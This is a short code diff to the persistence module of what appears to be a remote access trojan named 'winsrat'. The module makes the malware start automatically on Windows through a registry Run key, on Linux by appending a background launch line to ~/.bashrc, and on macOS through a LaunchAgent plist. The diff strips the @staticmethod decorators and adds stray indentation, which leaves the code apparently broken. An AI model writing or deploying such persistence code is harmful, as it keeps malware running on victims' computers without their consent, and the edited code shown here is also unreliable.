@@ -4,7 +4,7 @@ import os
 import platform
 
 class Persistence:
-    @staticmethod
+
     def install():
         try:
             system = platform.system()
@@ -15,12 +15,14 @@ class Persistence:
             elif system == "Darwin":
                 Persistence._install_macos()
             else:
-                # print(f"[!] Unsupported OS: {system}")
-                pass
+		
+                print(f"[!] Unsupported OS: {system}")
+                
         except Exception as e:
+            pass
             # print(f"[!] Persistence error: {e}")
 
-    @staticmethod
+
     def _install_windows():
         import winreg
         exe = sys.executable
@@ -33,14 +35,14 @@ class Persistence:
         winreg.CloseKey(key)
         # print("[+] Persistence installed on Windows.")
 
-    @staticmethod
+
     def _install_linux():
         rc_path = os.path.expanduser("~/.bashrc")
         with open(rc_path, 'a') as rc:
             rc.write(f"\npython3 {sys.argv[0]} &\n")
         # print("[+] Persistence installed on Linux.")
 
-    @staticmethod
+   
     def _install_macos():
         plist = os.path.expanduser("~/Library/LaunchAgents/com.winsrat.agent.plist")
         content = f"""<?xml version="1.0" encoding="UTF-8"?>
